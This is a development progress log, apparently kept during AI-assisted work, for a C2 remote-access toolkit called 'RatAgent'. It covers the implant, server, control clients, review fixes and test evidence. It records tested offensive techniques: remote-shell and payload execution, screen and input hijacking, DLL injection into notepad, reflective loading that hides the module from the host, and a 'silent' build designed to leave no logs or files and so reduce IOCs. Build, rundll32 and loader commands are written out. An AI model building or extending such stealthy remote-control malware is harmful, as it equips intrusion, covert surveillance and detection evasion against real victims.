# 项目进度记录（PROGRESS）

> 最后更新：2026-10-12（本轮补 §8.5：外部反射加载器 RfUdrl 加载 RatAgent.dll 实测）。
> 本文件记录**本仓库（`D:\code\projects\c2-suite`）**的实际状态。

## 1. 项目概览

`c2/` —— 基于《ARCHITECTURE.md》的 C2 远控系统（已按 DESIGN.md 演进）：
- **Agent**：C++（`c2/client/core`），**一套 core 编成多个模块产物**（名字 = `RatAgent.<module>.<形态>`）：
  - `RatAgent.<module>.exe`（控制台形态，`main.cpp`）：默认 beacon（HTTP 轮询 8080），`-tcp` 切长连接（4444）
  - `RatAgent.<module>.dll`（`agent_dll.cpp` + `agent_runtime`）：rundll32 / 宿主 LoadLibrary / 注入，可优雅停止与卸载
  - 现有模块：`sys`（系统类）/ `screen`（远程桌面）/ `template`（工程模板）
- **Server**：Go（`c2/server/cmd/c2server`），TCP 4444（ctl 信道）+ HTTP 8080（beacon）+ **TCP 4445（屏幕流中继）**
- **CTL**：`ratctl`（Go 交互式 shell）+ `im_ctl`（ImGui 控制端）+ `viewer`（C++ Win32 远控查看器）

## 2. 已完成功能

| 功能 | 状态 | 验证 |
|---|---|---|
| 协议层（20B 头 + AES-GCM + HKDF + 向量） | ✅ | go test |
| beacon 信道（GET 命令/POST 结果/伪装 HTML） | ✅ | e2e_m3 + 本轮 e2e |
| 命令分发中心（SYS_INFO/EXEC_PS） | ✅ | e2e_m2/m3 + 本轮 e2e |
| ratctl 交互式 shell（meterpreter 风格） | ✅ | e2e_m3 |
| **屏幕流（长连接 4445）**：ScreenSpy→WIC JPEG→中继→ctl | ✅ | e2e_m4 + 本轮 e2e |
| 输入事件下行（ctl→c2server→agent 注入） | ✅ | 本轮 e2e（C2 日志 relayed input） |
| im_ctl（ImGui：会话/命令/屏幕显示/输入回放） | ✅ 编译+界面 | 未端到端跑 GUI |
| **ratctl 命令补全**：`session`/`kill`/`screenshot`/`screen`/`stop`/`payload` | ✅ | 本轮 e2e |
| **远程截屏 0x1001**（GDI 抓帧 + WIC JPEG） | ✅ | 本轮 e2e（257 KB JPEG） |
| **payload 上传执行 0x3009**（分块→%TEMP%→CreateProcess） | ✅ | 本轮 e2e（真实执行 + 标记文件） |
| **viewer（C++ Win32 查看器）** | ✅ | 本轮 e2e（190 帧 + 输入下发 + 停流） |
| **Agent DLL 形态**（rundll32 / LoadLibrary / 注入） | ✅ | §8.4（导出表/依赖/三种宿主） |
| **可停止**（进程内标志 + 跨进程命名事件） | ✅ | §8.4（rundll32 ↔ 另一进程 Stop；宿主存活） |
| **`-tcp` 长连接模式可命令行切换**（不必改 `main()`） | ✅ | §8.4（sessions 显示真实 IP:PORT） |
| **加载即自启**（有 `autostart.args` 用文件参数，无则内置默认配置） | ✅ | §8.4 / §8.5 |
| **反射加载（外部 RfUdrl）**：cpl link 出 PIC → runpic 宿主 → 手动映射上线/远控/优雅停止 | ✅ | §8.5（宿主模块表无 RatAgent.dll） |
| **静默构建**（`RAT_AGENT_DEBUG=0`：无诊断输出、磁盘零写入） | ✅ | §8.6（诊断串 6/6 → 0/6） |
| 本地 git 版本管理（VS 专用 .gitignore） | ✅ | 见 §4 |

## 3. 关键架构（屏幕流 + payload）

```
Agent(beacon 8080 / 长连接 4444) ──命令──▶ c2server ◀──ctl(4444)
Agent ──4445 屏幕流连接──▶ c2server ──帧(转换加密)──▶ ctl 中配对的那条连接
ctl ──输入事件 0x0504──▶ c2server ──转发──▶ Agent(4445) → SendInput 注入
ctl ──payload 0x3009（分块）──▶ c2server（透明转发）──▶ Agent：写 %TEMP%\c2_payload\ → CreateProcess
```

- 命令流转：ctl 发业务指令（payload 首 16B = agent_id）→ c2server 剥离前缀后按 agent 模式
  （beacon 入队 / 长连接直发）下发 → Agent `cmd_dispatch` 处理
- 帧：`CmdScreenFrame(0x0503)` = seq+w+h+jpeg_len+JPEG（stream_key 加密）
- 输入：`CmdInputEvents(0x0504)` = agent_id(16)+count+InputEvent[24B]（ctl→C2 带前缀，C2 去前缀转发）
- **屏幕流配对关键点**：C2 把帧发给"**发起 0x1002 的那条 ctl 连接**"，
  所以流必须由 viewer 自己发起；ratctl 的 `screen` 只负责拉起 viewer 进程
- payload 分块格式见 `docs/protocol.md` §10；ctl 中间块流水线发送、只等末块结果

## 4. Git 提交历史（本仓库，均可回退）

```
6c2b065 docs: 记录 Agent 双产物（形态/用法/注入契约/实测证据）
3cd7d30 feat(agent): RatAgent 双产物 —— EXE/DLL 共享 core，支持 rundll32/宿主/注入与优雅停止
fee717e docs: PROGRESS §8.2/8.3 收口（6 项既有问题+1 项新发现全部修复并附实测证据）
4b4c072 fix(server): HELLO_ACK server_time 改小端 + beacon 零长度结果解码不再 EOF
cf8943b fix(ctl): seq 在发送锁内分配 + 响应按 pending 优先投递
6243970 fix(agent): 屏幕流 fps/quality 生效 + 线程状态机自愈 + 输入重装缓冲 + 未知指令回包
226a3a5 fix: 按 review 结论修复交付面问题（越界读/UAF/坐标基准等）
907d636 feat: viewer 远程查看器 + ctl_client 插件/wait 参数 + 文档同步
66f5d66 feat: 协议扩展(0x1001 截屏/0x3009 payload) + Agent 实现 + ratctl 命令补全
27e49f4 chore: 初始化仓库（VS 专用 .gitignore，仅托管源码与文档）
```

## 5. 快速启动（下次开工）

```powershell
# 0) 先杀残留进程（重要！端口占用会静默失败）
taskkill /F /IM c2server.exe 2>$null; taskkill /F /IM RatAgent.exe 2>$null; taskkill /F /IM viewer.exe 2>$null
netstat -ano | findstr ":4444 :4445 :8080"

# 1) Go（本机 go 在 PATH：C:\Users\Mutsumi\.g\go\bin\go.exe）
$env:GOCACHE='D:\code\projects\c2\.gocache'      # 沙箱/受限环境必须指向可写目录
go build -o build/bin/c2server.exe ./server/cmd/c2server
go build -o build/bin/ratctl.exe   ./ctl/cmd/ratctl
go test ./...

# 2) Agent EXE + DLL（VS2022/18 MSBuild；输出到工作区 build/，避开既有 VS 目录 ACL）
$msb = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
& $msb client\RatAgent.sys.exe.vcxproj -p:Configuration=Debug -p:Platform=x64 `
  -p:IntDir=D:/code/projects/c2/build/agent/obj/ -p:OutDir=D:/code/projects/c2/build/agent/bin/
& $msb client\RatAgent.sys.vcxproj -p:Configuration=Debug -p:Platform=x64 `
  -p:IntDir=D:/code/projects/c2/build/dll/obj/ -p:OutDir=D:/code/projects/c2/build/dll/bin/

# 3) viewer（CMake，独立工程）
cmake -S viewer -B build/viewer
cmake --build build/viewer --config Debug        # 产物 build/viewer/bin/viewer.exe

# 4) 运行联调（beacon 默认；-tcp 切长连接）
.\build\bin\c2server.exe
.\build\agent\bin\RatAgent.sys.exe 127.0.0.1 8080 -s 5      # beacon
.\build\agent\bin\RatAgent.sys.exe 127.0.0.1 4444 -tcp      # TCP 长连接
rundll32 .\build\dll\bin\RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5,id=.\build\dll\run\agent.id,log=.\build\dll\run\agent.log
rundll32 .\build\dll\bin\RatAgent.sys.dll,Stop  id=.\build\dll\run\agent.id,log=.\build\dll\run\agent.log
.\build\bin\ratctl.exe                           # 交互式：sessions → use <id> → ...
```

ratctl 命令集（`help` 可查）：
`sessions / use <id> / back / session <id> / kill <id> / sysinfo / exec <ps> /
screenshot [id] <file> / screen [id] [fps] [quality] [scale] / stop / payload <file> [name] [--args <参数>]`

## 6. 剩余待办

1. **im_ctl GUI 手动端到端**：启动 server+agent+im_ctl，选 agent → start stream 看屏幕 →
   移动鼠标验证回放注入（hook 已实现；本轮只验证了 viewer 这条等价链路）
2. **`kill <id>` 对 beacon 会话不生效**：服务端 `CtlKillSession` 只 `Close()` 连接，
   beacon 会话没有 TCP 连接；需要服务端补"标记下线并从注册表删除"
3. **payload 落盘策略**：当前固定 `%TEMP%\c2_payload\<name>`，同名覆盖、不自动清理
4. **e2e_m1/m2 过时**：直连模型历史脚本，可归档
5. 正式化：PSK 外部化、多显示器/区域抓屏配置、屏幕流码率自适应
6. **（可选）仓库内注入器/加载器工具**：本轮验证用的 `inject.exe`（远程 LoadLibrary + 触发器）
   是临时测试工具，未入库；如需长期使用可在 `tools/` 下补一个正式版本
7. **（可选）手动映射 loader**：DLL 已按契约适配（静态 CRT/不依赖模块路径/无 TLS），
   并已用**外部反射加载器 RfUdrl** 实测通过（§8.5）；仓库内只提供 PIC 执行器
   `tools/runpic`（不含 loader 逻辑，loader 在 RfUdrl）

## 7. 已知注意点

- **构建目录 ACL**：`bin/`、`client/x64/`、`client/RatAgent/x64/`、`im_ctl/build/` 等
  既有目录在受限（沙箱）会话下**不可写**；受限环境一律输出到工作区内新目录
  `build/`、`.gocache/`（已在 .gitignore）
- **Agent 入口与模式**：`main.cpp` 现在是薄壳（解析 argv → `agent_start` → 等待），
  默认 beacon；**`-tcp` 参数即可切长连接**（不必再改 `main()` 源码）
- **DLL 形态要点**（详见 DESIGN §4.2.1）：
  - rundll32 的 `Start` **阻塞驻留**（入口点返回 = rundll32 退出进程）；宿主/注入器用非阻塞的 `StartAgent`
  - 停止：进程内标志 + 命名事件 `Local\RatAgentStop.<agent_id_hex>`；
    `Stop` 可在**另一个进程**里按 id 文件或 32 位 hex 触发
  - 注入：**不要**把远程线程入口指向导出（目标的 CFG/XFG 会给 `0xC0000409`）；
    用"远程 `LoadLibraryW` → 加载即自启"。自启是 DllMain 之后延迟 300ms 的线程：
    有 `autostart.args` 用文件参数，**没有就用内置默认配置**（副作用见 §8.5 实测影响）
  - DLL 默认落盘 `%LOCALAPPDATA%\RatAgent\`（`agent.id`/`agent.log`），可用 `id=`/`log=` 覆盖；
    静态 CRT `/MT`，`dumpbin /dependents` 只有系统 DLL
  - 手动映射须先调用入口点（`DLL_PROCESS_ATTACH`）初始化 CRT，再调导出
- **测试用后台进程**：用 `Start-Process` 或工具前台上限内启动的进程可能在命令结束时被回收；
  长跑进程用受管后台作业启动
- **屏幕流参数已生效**：`fps/quality/scale` 全部按 0x1002 参数工作（截屏 0x1001 质量为 75）；
  帧节奏由 `next_frame` 时间片控制，输入轮询最多占用等待下一帧的空档（≤50ms）
- **屏幕流线程可自愈**：连接断开时线程自行退出并清标志，之后可直接再次 start（无需先 stop）
- **viewer 强杀不停流**（不会发 control=0）→ 用 `ratctl stop` 兜底
- **屏幕流帧的 seq 是 agent 侧递增**；ctl 端读线程对 `0x0503` 帧跳过防重放（独立 seq 空间）
- **业务指令 plugin 字段**：C2 当前只按 cmd 段路由，plugin 不符也能工作；
  新代码已按规范填正确 plugin（system=3 / remote=1），后续插件化时不要依赖旧行为
- `im_ctl/external/imgui`、`im_ctl/external/glfw`、`im_ctl/external/glad` 是**第三方目录**
  （imgui 内含独立 .git），已在 .gitignore 中整体忽略，clone 后需单独获取

## 8. 交付前只读 review 结论（子代理静态审查）

### 8.1 第一轮已修复

| 级别 | 位置 | 问题 | 修复 |
|---|---|---|---|
| 高 | `im_ctl/ctl_client.cpp` 帧分发 | `body.size() >= 12 + jl` 在 32 位回绕 → 越界读，可达 `memcpy(NULL, jpeg, 4GiB)` 崩溃（帧内 jpeg_len 由被控端提供，C2 不校验） | 改为 `jl <= body.size() - 12` |
| 高 | `im_ctl/ctl_client.h/.cpp` 待响应表 | `Pending` 为栈对象、map 存裸指针；超时返回与迟到响应竞争 → use-after-free | 改为 `std::shared_ptr<Pending>` |
| 中 | `viewer/main.cpp` 输入 | 钩子给桌面坐标，图像矩形是客户区坐标，缺 `ScreenToClient` → 鼠标坐标整体偏移 | flush 前 `ScreenToClient` |
| 中 | `ctl/cmd/ratctl/viewer_launch.go` | 候选路径与 CMake 实际输出（`<build>/bin/viewer.exe`）不匹配 | 补 `viewer/build/bin`、`build/viewer/bin` 等候选 |
| 低 | `im_ctl/ctl_client.cpp` listSessions | `rd32() \| ((uint64_t)rd32()<<32)` 未定序 UB（且都改 `off`）→ last_seen 错值 | 拆成两条语句 |
| 低 | `im_ctl/ctl_client.cpp` JPEG 解码 | `GlobalAlloc/GlobalLock` 未判空、解码尺寸未校验 → OOM/超大图崩溃 | 判空 + 1 亿像素上限 + 输入长度上限 |
| 低 | `client/core/cmd_dispatch.cpp` | 错误码在 `CloseHandle` 之后取；`SetFilePointerEx` 未检查 | 取码前移 + 检查返回值 |
| 低 | `ctl/cmd/ratctl/payload.go` / `main.go` | `--args` 超 64KiB 会被 u16 截断；分块常量与 packet.go 重复 | 增加长度校验；改用 `protocol.PayloadChunkSize` |
| 低 | `viewer/main.cpp` | `g_startupDone` 只写不读、`g_frameCount` 非原子；关窗早于启动线程发流会漏停 | 删除残留标志、改 `std::atomic`、先 `join` 再决定是否发停止 |
| 低 | `docs/protocol.md` §3.3 | 文档写 0x4002/0x4003 payload 为 16B agent_id，实际是 32B hex 字符串 | 更正文档 |

### 8.2 第二轮修复（本次全部完成）

第一轮 review 遗留的 6 项既有问题已全部修复，另在验证中**新发现并修复 1 项**：

| # | 位置 | 问题 | 修复 |
|---|---|---|---|
| 1 | `im_ctl/ctl_client.cpp` | seq 在发送锁外分配 → 并发发送时 seq 与落网顺序不一致，被 C2 防重放丢包；读线程 `h.seq <= lastSeq_` 单调闸门会永久吞掉"晚到的较早响应" | `sendRaw` 改为在发送锁内分配 seq；`sendAndWait` 的"分配 seq + 登记 pending + 发送"合并到同一锁；读线程改为**先按 seq 找等待者投递**，仅对无人认领的包走防重放闸门 |
| 2 | `client/core/screen_stream.cpp` | `fps/quality` 形参完全不生效（帧间隔硬编码 25fps、JPEG 质量硬编码 70；`encode_jpeg_bgra` 从不设置 WIC 质量属性 → 截屏 0x1001 的 75 也无效）；输入轮询的 50ms 阻塞还挤占帧节奏 | 帧节奏改为**基于 `next_frame` 的时间片**；JPEG 质量经属性包在 `frame->Initialize` 之前写入；`fps/quality/scale` 全部生效 |
| 3 | `client/core/screen_stream.cpp` | 先置 `g_running=true` 再建线程（失败则永久"已在运行"）；线程自行退出不清标志（断开后无法重启）；stop 等 5s 超时仍关句柄置空 → 可能并存两条流线程 | 新增 `g_thread_alive` + `ThreadGuard`（任何退出路径都清标志）；start 先占位、建线程失败回滚；stop 超时**保留句柄**，由 `reap_finished_thread()` 在线程退出后回收 |
| 4 | `client/core/screen_stream.cpp` | 50ms 轮询直接读包，超时丢半包 → 字节流错位、输入事件静默丢失 | 新增 `InputStream`：**自持重装缓冲** + `select` 短等待，只从缓冲切完整包，半包留待下次 |
| 5 | `client/core/main.cpp`、`beacon.cpp` | 未知指令两信道行为不一致（长连接不回包 → ctl 空等 240s 超时；beacon 回 status=1） | 长连接也回 `CMD_RESULT(status=1)`，与 beacon 及协议 §2 一致 |
| 6 | `server/cmd/c2server/main.go` | HELLO_ACK 的 `server_time` 用 BigEndian，与"统一小端"文档冲突 | 改 LittleEndian（无解析方，行为无影响） |
| 7 | `server/cmd/c2server/beacon.go` | **验证中新发现**：`decodeResults` 对零长度结果调用 `r.Read(空切片)`，`bytes.Reader` 在缓冲区末尾返回 `io.EOF` → 整个结果块解码失败，Agent 反复 `POST failed`（任何"status 非 0 且结果为空"的结果都会触发，未知指令即此类） | `ln > 0` 才读结果，并改用 `io.ReadFull`（避免短读静默截断） |

### 8.3 第二轮验证证据（beacon agent + 临时探针，均为实测）

| 项 | 证据 |
|---|---|
| server_time 小端 | 探针按小端解析 = 本机 `UnixMilli`，drift=0ms |
| fps 生效 | 请求 6 / 8 / 5 → 实测 6.1 / 8.1 / 5.2 fps（修复前恒为"25fps 减去 50ms 轮询开销" ≈ 7–10） |
| quality 生效 | 同 scale 下：quality 25 → 52.8KB、40 → 37KB、80 → 90.5KB、90 → 157.5KB |
| scale 生效 | 50% → 1280×720、40% → 1024×576、30% → 768×432 |
| 输入下行 + 重装缓冲 | 探针发 0x0504 → C2 `relayed input events` → Agent `injected 1 input events` |
| 未知指令 | `0x3099` → `CMD_RESULT status=1`（不再空等；同时验证第 7 项修复） |
| 线程自行退出后重启 | 杀掉 C2 → Agent `input channel broken` → `stopped`；重启 C2 后再 start → `screen stream started`（修复前会返回"已在运行"） |

> 本轮验证用临时探针（`build/e2e/probe.go`，gitignored；验证后已移入回收站）。

### 8.4 第三轮：Agent 双产物（EXE/DLL）验证证据

| 场景 | 做法 | 结果 |
|---|---|---|
| 导出表 | `dumpbin /exports RatAgent.dll` | ✅ `Start/Stop/StartAgent/StopAgent/StopAgentEx/AgentRunning/AgentVersion/AgentMode/AgentPing/AgentBootstrap` |
| 依赖（注入安全） | `dumpbin /dependents` | ✅ 仅系统 DLL，**无 VC 运行库 DLL**（静态 CRT `/MT`） |
| rundll32 启动 | `rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5,id=…,log=…` | ✅ 日志落盘 + beacon 上线 + 进程驻留 >20s |
| 跨进程停止 | 另一进程 `rundll32 … ,Stop id=<id 文件>` | ✅ `-> signalled` → 目标实例 `[beacon] stopped` → 入口点返回、进程退出 |
| LoadLibrary 宿主 | `LoadLibraryW` → `StartAgent` → `StopAgent` → `FreeLibrary` | ✅ 上线 → 优雅停止（`running=0`）→ 卸载无异常 |
| 注入（远程加载 + 触发器） | 写 `%TEMP%\RatAgent\autostart.args` → 远程 `LoadLibraryW` 进 notepad | ✅ agent 在 **notepad 进程内**上线；跨进程 Stop 后**宿主进程存活** |
| EXE 回归（beacon） | `RatAgent.exe 127.0.0.1 8080 -s 5` | ✅ 稳定 id、beacon-agent 上线 |
| EXE 新 `-tcp` | `RatAgent.exe 127.0.0.1 4444 -tcp` | ✅ 握手成功；sessions 显示真实 `127.0.0.1:58484` / `os=Windows`，与 beacon 并存 |
| DLL 配置 | Debug 与 Release | ✅ 均生成（两者都 `/MT`） |

**重要反面证据**：把远程线程入口直接指向 DLL 导出（含零 CRT 依赖的 `AgentPing`）在 Win11 目标
返回 `0xC0000409`（`__fastfail`）——目标进程的 CFG/XFG 缓解；而远程 `LoadLibraryW`（kernel32 地址）
正常。故注入采用"远程加载 + `autostart.args` 触发器自启动"。

> 本轮验证用临时工具（`build/e2e/{host,inject}.cpp` + `probe`，gitignored；验证后已移入回收站）。

### 8.5 第四轮：外部反射加载器（RfUdrl）加载 RatAgent.dll 实测

**目标**：验证 Kali 上的反射加载项目 **RfUdrl**（Crystal Palace + LibTCG 的 PIC loader）
能把 `RatAgent.dll` 完整走"手动映射（reflective load）"路径加载起来并可用。
此前只有契约适配（静态 CRT/不依赖模块路径/无 TLS），**没有实测**。

**组件**

| 侧 | 组件 | 说明 |
|---|---|---|
| Kali | `~/opts/tcg/RfUdrl` | `make x64` → `cpl link loader.spec RatAgent.dll out.bin`（PIC，内嵌 DLL） |
| Windows | `tools/runpic`（本仓库新增） | PIC 执行器：读 blob → RWX 映射 → `CreateThread` 进 `go()`（偏移 0） |
| Windows | `RatAgent.dll` | MSVC `RatAgentDll.vcxproj` Debug x64（静态 CRT `/MT`），被 cpl 链进 PIC |
| Windows | `c2server` / `ratctl` | 本套件，作 C2 侧验收 |

**复现**

```bash
# Kali
cd ~/opts/tcg/RfUdrl
make x64 && /home/kali/opts/crystalpalace/cpl link loader.spec RatAgent.dll out.bin -g out.yar
```
```powershell
# Windows：build/e2e/out.bin 就位后，一条命令跑完整验收
python scripts/e2e_rdll.py   # 起 c2server → 写触发器 → runpic 执行 PIC → ratctl 验收 → 停止
```

**实测证据（`python scripts/e2e_rdll.py` = ALL PASS）**

| 项 | 证据 |
|---|---|
| PIC 映射执行 | `pic mapped at 0000017EEF7B0000 (RWX), entry = offset 0` |
| **DllMain 经合成栈正常返回** | `loader thread exited (code=1) — DLL entry point returned`（NtContinue 入口转移 + 合成栈；返回值 = DllMain 的 TRUE） |
| **确为反射加载（非 LoadLibrary）** | 宿主进程模块表共 33 个模块，**没有** `RatAgent.dll`（`EnumProcessModulesEx` 实测） |
| 入口点/CRT 初始化生效 | 映射镜像内 DLL 自己的 `autostart trigger` / `agent_start` / beacon 代码正常运行 |
| beacon 上线 | c2server：`[beacon] <id> registered (first GET)`；agent：`[beacon] started ... cookie=<id>` |
| 业务指令（beacon 经 GET/POST） | `0x3001 SYS_INFO` 259B、`0x3008 EXEC` 36B（`echo rdll-reflective-ok`）、`0x1001 SCREENSHOT` 206,225B JPEG，均 `results posted ok` |
| 优雅停止 | 磁盘 DLL 的 `Stop` 导出（rundll32，**另一进程**）→ 命名事件 `Local\RatAgentStop.<id>` → `-> signalled` → `[beacon] stopped` + `agent worker exit (rc=0)` |

**注意点**

- RfUdrl 的入口转移假定"入口点不返回"；本 DLL 的 `DllMain` 会返回。实测返回后经合成
  `BaseThreadInitThunk` 帧正常收尾（loader 线程退出码 = DllMain 返回值），不影响已启动的
  agent 线程 —— 即"入口点返回"这一情形可用。
- 自启动靠 `client/core` 的触发器（首选 `%LOCALAPPDATA%\RatAgent\autostart.args`，次选
  `%TEMP%\RatAgent\autostart.args`）。受限沙箱里 LOCALAPPDATA 不可写，验收脚本自动挑可写位置。
- **`rundll32 … Stop` 前必须先删触发器**：否则 Stop 宿主的 `DllMain` 也会命中触发器、自己
  起一份 agent，`Stop` 就会走"同进程停止"分支，测不到跨进程命名事件这条路径。
- `runpic` 自身 stdout 要设无缓冲：有控制台时 DLL 不做日志重定向，而 DLL 启动时会把 stdout
  改成无缓冲，宿主的块缓冲输出会被丢掉。
- 本轮未修改 RfUdrl 源码（只构建产物 + scp 的 DLL），故其仓库无提交。

**补充（同日）：Release 形态 + "加载即自启"（无触发器文件即用默认配置）**

- 反射加载改用 **Release** 形态 DLL（374,272 B，`dumpbin /dependents` 仍只有系统 DLL），
  PIC 378,488 B；全流程同样 **ALL PASS**。Debug/Release 行为一致，Release 体积小得多。
- 自启动语义改为**加载即自启**（并移除早前的 `RAT_AUTOSTART_DEFAULT` 环境变量开关）：
  1. 有 `autostart.args` → 用文件里的参数串（**优先级最高**）；
  2. 没有该文件 → 用**内置默认配置**（beacon 127.0.0.1:8080、`-s 5`；id/日志落
     `%LOCALAPPDATA%\RatAgent\`）。
- 验收脚本相应简化为**两阶段**（`scripts/e2e_rdll.py`，子进程 `LOCALAPPDATA` 指向工作区）：

| 阶段 | 条件 | 期望 | 实测 |
|---|---|---|---|
| P1 | 有 `autostart.args`（显式参数） | 完整远控 + 跨进程优雅停止 | ✅ 全项 PASS（含 231,620 B 截屏） |
| P2 | 无 `autostart.args` | 按内置默认配置自启 | ✅ `sleeptime=5s`（P1 是 `-s 2`）、id 落 `…\home\RatAgent\agent.id`、注册数 1→2 |

**"加载即自启"的实测影响**（`build/e2e/check_rundll32.py`，一次性诊断，未入库）：

| 场景 | 实测结果 |
|---|---|
| `rundll32 … Start <args>`（无触发器文件） | ✅ 显式参数生效（`sleeptime=3s`）、rundll32 驻留；但日志多一对噪声：`autostart (no trigger -> default config)` + `[!] already running` |
| `rundll32 … Stop <id>`（无触发器文件） | ✅ 目标实例被停止（`-> signalled` + `[beacon] stopped`），未走同进程分支；`Stop` 不阻塞、rundll32 在 300ms 自启前就退出，**不产生幻影 agent** |
| 常驻 `LoadLibrary` 宿主、不调用任何导出 | ⚠ **宿主进程内自动起一份默认 agent**（实测：`agent_start … sleeptime=5`、默认 `agent.id` 落盘） |
| 常驻宿主、晚于 300ms 才 `StartAgent(args)` | ⚠ 结构性风险：默认自启先占坑 → 参数被忽略（本机未复现，取决于加载/杀软延迟） |

### 8.6 第五轮：静默构建（编译期开关）

**目的**：能出一个"最小可观测面"的 Agent —— 不打印任何诊断、不在磁盘留任何文件（降 IOC）。

**实现**：新增 `client/core/agent_debug.h`，两个编译期宏（可由 MSBuild 属性覆盖，默认保持既有行为）

| 宏 | MSBuild 属性 | 默认 | 作用 |
|---|---|---|---|
| `RAT_AGENT_DEBUG` | `RatAgentDebug` | 1 | 0 → `AGENT_LOG(...)` 展开为空操作（**格式串不进二进制**），不落日志、不碰 stdout |
| `RAT_AGENT_PERSIST_ID` | `RatAgentPersistId` | 跟随前者 | 0 → `agent.id` 不落盘，身份只在内存 |

- 65 处诊断 `printf` 统一改为 `AGENT_LOG(...)`；`snprintf`（构造命令结果用）不受影响。
- 静默时同时跳过：建目录、`_wfreopen` 落日志、`setvbuf`（不再改宿主 stdout）；
  `agent_redirect_stdout()` 内部也加了兜底，任何调用方都无法在静默构建下落日志。
- **顺带修掉一个身份一致性隐患**：新增 `agent_ensure_id()` 做"进程内唯一 id"缓存。
  静默构建下 id 不落盘，若不缓存，`agent_start`（拿它命名停止事件）与 worker（拿它上报
  cookie）会各自随机出一个 id —— "服务器看到的 id"与"事件名里的 id"就对不上。

**实测证据**

| 项 | 常规（默认 1/1） | 静默（`RatAgentDebug=0`） |
|---|---|---|
| DLL 体积（Release） | 374,784 B | **351,232 B** |
| 典型诊断串命中（6 条） | 6/6 | **0/6** |
| `python scripts/e2e_quiet.py` | — | **ALL PASS**（上线 + sysinfo + 零输出 + 零文件） |
| `python scripts/e2e_rdll.py`（回归） | **ALL PASS** | —（默认行为未变） |

静默实测细节：agent 以默认配置上线（服务器 `registered (first GET)`）、`sysinfo` 正常回传、
runpic 宿主自身输出仍在而 **agent 诊断行 0 条**、`%LOCALAPPDATA%\RatAgent` 目录**未被创建**、
`agent.log` 与 `agent.id` 均不存在。

**代价（已文档化）**：静默版重启后 id 变化 → "重连同 id"与"凭 id 文件跨进程停止"不再成立
（仍可按已知 32 位 hex 触发事件）；命名事件 `Local\RatAgentStop.<id>` 仍会创建（内核对象，非磁盘 IOC）。

## 9. 模块化改造（进行中）

> 目标：把"一个全量 agent"变成"多个模块 agent"——每个模块是**独立进程、直连 C2**；
> 新增能力 = 复制模板 + 改指令表。**不做**插件 ABI / `plugin_api.h` / 加载器。
> 分阶段推进（收益高·稳定·适配强 → 试验性），每阶段独立可用、可回退。
>
> 注：§8.x 是改造**之前**的记录，里面出现的 `agent.id`/`agent.log`/`autostart.args`
> 是当时的文件名；§9.1 之后一律带 `<module>` 前缀。

### 9.1 阶段 0：模块命名空间（✅ 完成）

同一份 core 编出的多个模块在同一台机器共存时，必须各有自己的落盘物与 C2 标识。
**这不是优化项而是前提**：服务端 `Registry.Register` 按 agent_id 索引、冲突时踢掉旧会话
（[session.go](../server/internal/session/session.go)），两个模块共用一份 id 会**互相踢下线**。

| 项 | 规则 |
|---|---|
| 模块名 | [client/core/module_id.h](../client/core/module_id.h) 的 `RAT_MODULE_ID`（编译期，默认 `sys`；阶段 0 时叫 `full`，见 §9.5） |
| 身份/日志/自启 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `<module>.log` / `<module>.autostart.args`；EXE 形态为 CWD 下的 `<module>.id` |
| 停止事件 | `Local\RatAgentStop.<agent_id_hex>` —— **刻意不加模块前缀**：各模块 id 随机不撞名，这样**任一模块**的 DLL 导出 Stop 都能停**任意模块**的实例（加了前缀反而只能停自己） |
| C2 侧标签 | 握手 `os_info` = `Windows (<module>)`；能力位 `Session.Plugins`（bit0 系统类 / bit1 远程桌面） |
| 构建 | `-p:RatAgentModuleId=…` / `-p:RatAgentModuleCaps=…`（MSBuild 属性，默认 `sys`） |

**实测证据**（`python scripts/e2e_modules.py` = **ALL PASS**；同一工程编两次 → `full` + `probe` 并发）：
两个模块各自生成自己的 id 文件、互不串名；两个会话都在线且 agent_id 不同；
服务端日志同时出现 `os="Windows (full)" plugins=0x00000003` 与
`os="Windows (probe)" plugins=0x00000001`；`ratctl session <id>` 显示模块标签与能力位。

**回归**：`scripts/e2e_rdll.py`（反射加载全流程）与 `scripts/e2e_quiet.py`（静默构建）均 **ALL PASS**。

**已知缺口**：beacon 信道的会话在服务端是**硬编码** `OSInfo="beacon-agent"` 的
（[beacon.go](../server/cmd/c2server/beacon.go)），握手元数据只走 TCP 长连接的 HELLO
→ **模块标签在 beacon 模式不可见**，需要一次小的协议补充（待做）。

### 9.2 阶段 1：共享内核 + 模块模板（✅ 完成）

**目标**：切断 core 对具体能力的反向依赖，并建立"复制模板即可加模块"的骨架。

**改法**：新增能力注册表，core 不再认识任何具体能力

| 文件 | 作用 |
|---|---|
| [core/capability.h](../client/core/capability.h) / `.cpp` | 注册表：**指令处理器表** + **配置钩子**；`cap_ensure_registered()` / `cap_dispatch()` / `cap_notify_config()` |
| [core/screen_module.h](../client/core/screen_module.h) / `.cpp` | 原长在 core 里的屏幕能力：`0x1001` 截屏、`0x1002` 屏幕流、配置钩子（**阶段 2 整体搬走**） |
| [client/caps_full.cpp](../client/caps_full.cpp) | 工程级能力清单：`register_module_capabilities()` —— **加/减能力只改这里** |
| [client/agents/_template/](../client/agents/_template/) | 模块工程模板（DLL + EXE 两个工程 + `caps.cpp` + README） |

具体动作：
- `cmd_dispatch.cpp`：删掉 `screen_spy`/`screen_stream` 的 include 与 `0x1001`/`0x1002` 两个 case；
  `switch` 的 `default` 改为**先查能力注册表**，未命中才算未知指令；
- `agent_runtime.cpp`：删掉 `screen_stream.h`，两处 `screen_stream_set_config()` 改为 `cap_notify_config()`；
  `agent_start()` 里调用一次 `cap_ensure_registered()`（幂等）；
- 两个 vcxproj 增加 `caps_full.cpp` / `capability.cpp` / `screen_module.cpp`，并把 `core` 加入头文件搜索路径；
- `ratctl` 新增 **`raw <cmd_hex> [payload_hex]`**：发送任意业务指令，用于测新模块的自定义指令。

**实测证据（五项验收全绿）**

| 脚本 | 验证内容 | 结果 |
|---|---|---|
| `scripts/e2e_caps.py` | 搬移后行为不变：`0x1001` 截屏（218 KB JPEG）、`0x1002` 屏幕流 stop | ✅ ALL PASS |
| `scripts/e2e_template.py` | 模板独立编译并上线：`template.id`、标签 `Windows (template)`、能力位 `0x1`、**自定义指令 `raw 2001 deadbeef` → `demo-echo`**、core 的 `sysinfo` 照常 | ✅ ALL PASS |
| `scripts/e2e_modules.py` | 同机多模块共存（full + probe） | ✅ ALL PASS |
